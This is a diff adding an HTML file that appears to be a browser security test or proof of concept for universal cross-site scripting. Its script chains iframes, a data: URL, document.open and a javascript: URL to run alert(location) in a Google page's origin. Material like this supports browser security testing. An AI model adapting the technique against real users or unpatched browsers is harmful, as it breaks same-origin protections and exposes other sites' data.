@@ -1,0 +1,16 @@
+<body>
+  <script>
+    var frame = document.body.appendChild(document.createElement("iframe"));
+    frame.src = "https://www.google.com/intl/en/ads/";
+    frame.onload = function() {
+      frame.onload = null;
+      frame.contentWindow.frames[0].location = "data:text/html,<script>(" + function() {
+        frame = document.documentElement.appendChild(document.createElement("iframe"));
+        frame.contentWindow.setTimeout("parent.document.open()", 0);
+        setTimeout(function() {
+          location = "javascript:'<script>parent.eval(\"alert(location)\")</scr" + "ipt>'"
+        }, 0);
+      } + "())</scr" + "ipt>";
+    }
+  </script>
+</body>
